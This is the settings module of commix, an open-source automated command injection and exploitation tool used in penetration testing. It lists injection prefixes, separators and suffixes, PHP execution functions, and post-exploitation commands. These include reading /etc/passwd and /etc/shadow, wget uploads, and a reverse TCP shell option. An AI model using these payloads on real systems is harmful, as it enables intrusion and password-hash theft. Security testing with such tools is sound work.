#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2015 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'doc/COPYING' for copying permission.
"""

import os
import sys
import time
import urllib

"""
The global variables.
"""

# About
APPLICATION = "commix"
DESCRIPTION = "Automated All-in-One OS Command Injection and Exploitation Tool"
AUTHOR  = "Anastasios Stasinopoulos"
VERSION = "v0.3b"
YEAR    = "2014-2015"
TWITTER = "@ancst" 

# Inject Tag
INJECT_TAG = "INJECT_HERE"

# Default target host OS (Unix-like)
TARGET_OS = "unix"

# Check Commit ID
if os.path.isdir("./.git"):
  with open('.git/refs/heads/master', 'r') as f:
    COMMIT_ID = "-" + f.readline()[0:7]
else:
    COMMIT_ID = "-" + "nongit" + "-" + time.strftime("%Y%m%d", time.gmtime(os.path.getmtime(min(os.listdir(os.getcwd()), key=os.path.getctime))))

# Check if OS is Windows.
IS_WINDOWS = hasattr(sys, 'getwindowsversion')

# Git URL.
GIT_URL = "https://github.com/stasinopoulos/" + APPLICATION + ".git"

# Output Directory
OUTPUT_DIR = ".output/"  

# Output file name
OUTPUT_FILE_NAME = "logs"

# Output file name
OUTPUT_FILE_EXT = ".txt"
OUTPUT_FILE = OUTPUT_FILE_NAME + OUTPUT_FILE_EXT

# Max Length
MAXLEN = "10000"

# Slow target response
SLOW_TARGET_RESPONSE = 3

# The command injection prefixes.
PREFIXES = ["", "'", "\"", "&", "%26", "|", "%7C", "%27", "%22"] 

# The command injection separators.
SEPARATORS = ["", " ", ";", "%3B", "&", "%26", "&&", "%26%26", "|", "%7C", "||", "%7C%7C", "%0a"]

# The command injection suffixes.
SUFFIXES = ["", "'", "\"", "#", "//", "\\\\", "&", "%26", "|", "%7C", "%27", "%22", "%5C%5C", "%2F%2F"]

# Bad combination of prefix and separator
JUNK_COMBINATION = ["&&&", "|||", "|&&", "&|", "&;", "|;", "%7C;", "%26;", "%7C&"]

# Execution functions
EXECUTION_FUNCTIONS = ["exec", "system", "shell_exec", "passthru", "proc_open", "popen"]

# The code injection prefixes.
EVAL_PREFIXES = ["", "'", ")", "')", "\")", "\".", "'.", ");}", "');}", "\");}"]

# The code injection separators.
EVAL_SEPARATORS = ["", ";", "%0a", "\\\\n"]

# The code injection suffixes.
EVAL_SUFFIXES = ["", "\\\\", "//", "#", ".\"", ".'", ")}"]

# The white-spaces
WHITESPACES = ["%20", "$IFS"]

# Time delay
DELAY = 1

# Default Temp Directory
TMP_PATH = ""

# Default Server's Root Directory
SRV_ROOT_DIR = ""
CUSTOM_SRV_ROOT_DIR = False

# The max help option length.
MAX_OPTION_LENGTH = 18

# Python version.
PYTHON_VERSION = sys.version.split()[0]

# Enumeration Commands
# Current user
CURRENT_USER = "whoami"
WIN_CURRENT_USER = "echo %username%"

# The hostname
HOSTNAME = "hostname"
WIN_HOSTNAME = "echo %computername%"

# Check if current user is root
IS_ROOT = "echo $(id -u)"
# Check if current user is admin
IS_ADMIN = "powershell.exe [Security.Principal.WindowsBuiltinRole]::Administrator"

# Operation System.
RECOGNISE_OS = "uname -s"
WIN_RECOGNISE_OS = "ver"

# Hardware platform.
RECOGNISE_HP = "uname -m"
WIN_RECOGNISE_HP = "echo %PROCESSOR_ARCHITECTURE%"

# File System access options
# Read file
FILE_READ = "cat "
WIN_FILE_READ = "type "

# Write file
FILE_WRITE = "echo "

# Write file
FILE_UPLOAD = "wget "

# /etc/passwd
PASSWD_FILE = "/etc/passwd"
SYS_USERS = "awk -F ':' '{print $1}{print $3}{print $6}' " + PASSWD_FILE 

# Exports users of localgroup
WIN_SYS_USERS = "powershell.exe write-host (([string]$(net user)[4..($(net user).length-3)])"

# /etc/shadow
SHADOW_FILE = "/etc/shadow"
SYS_PASSES = FILE_READ + SHADOW_FILE 

# Accepts 'YES','YE','Y','yes','ye','y'
CHOISE_YES = ['yes','ye','y']

# Accepts 'NO','N','no','n'
CHOISE_NO = ['no','n']

# Accepts 'QUIT','Q','quit','q'
CHOISE_QUIT = ['q','quit']

# Accepts 'W','w','U','u','Q','q'
CHOISE_OS = ['w','u','q']

# Accepts 'C','c','S','s','Q','q'
CHOISE_PROCEED = ['c','s','q']

# Available alternative shells
AVAILABLE_SHELLS = ["python"]

# Available injectipon techniques
AVAILABLE_TECHNIQUES = [
        "classic", "c",
        "eval-based", "e",
        "time-based", "t",
        "file-based", "f",
]

# User Agent List
USER_AGENT_LIST = [
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/31.0",
        "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/31.0",
        # Oldies 
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
]

# Proxy Protocol
PROXY_PROTOCOL = "http"

# Privoxy Proxy
PRIVOXY_IP = "127.0.0.1"
PRIVOXY_PORT = "8118"

# Cookie injection
COOKIE_INJECTION = False

# User-Agent injection
USER_AGENT_INJECTION = False

# Referer injection
REFERER_INJECTION = False

# Valid URL format check
VALID_URL_FORMAT = "https?://(?:www)?(?:[\w-]{2,255}(?:\.\w{2,6}){1,2})(?:/[\w&%?#-]{1,300})?"

# Accepted shell menu options
SHELL_OPTIONS = [
        '?',
        'quit',
        'back',
        'os_shell',
        'reverse_tcp'
]

# Cookie delimiter
COOKIE_DELIMITER = ";"

# Cookie delimiter
PARAMETER_DELIMITER = "&"

# Web-page Charset
CHARSET = ""

# Character Sets List (basic)
CHARSET_LIST = [
        "big5",
        "euc-kr",
        "iso-8859-1",
        "iso-8859-2",
        "iso-8859-3",
        "iso-8859-4",
        "iso-8859-5",
        "iso-8859-6",
        "iso-8859-7",
        "iso-8859-8",
        "koi8-r",
        "shift-jis",
        "x-euc",
        "utf-8",
        "windows-1250",
        "windows-1251",
        "windows-1252",
        "windows-1253",
        "windows-1254",
        "windows-1255",
        "windows-1256",
        "windows-1257",
        "windows-1258",
        "windows-874",
]

# Default server banner
SERVER_BANNER = ""

# Server banners list
SERVER_BANNERS = [
    "Microsoft-IIS",
    "Apache",
    "Nginx"
]

# Server banners list
SERVER_OS_BANNERS = [
    "win",
    "debian",
    "ubuntu",
    "fedora",
    "centos",
    "freebsd",
    "unix"
]

REVERSE_TCP = False

# Injection logs report
SHOW_LOGS_MSG = False

# Enumeration options
ENUMERATION_DONE = False
ENUMERATE_AGAIN = False

# FIle access options
FILE_ACCESS_DONE = False
FILE_ACCESS_AGAIN = False

# JSON Data
IS_JSON = False

# JSON Symbols
JSON_SYMBOLS = set("{}:'")

# TFB Decimal
TFB_DECIMAL = False

# Ignore Error Message
IGNORE_ERR_MSG = False

# Windows Python (2.7) installed directory.
WIN_PYTHON_DIR = "C:\\Python27\\"

# Windows PHP installed directory.
WIN_PHP_DIR = "C:\\xampp\\php\\"

# Windows comment
WIN_COMMENT = " REM "

#Delete command
WIN_DEL = " DEL "
DEL = " rm "

# Time-based Variables
FOUND_HOW_LONG = "" 
FOUND_DIFF = ""

#eof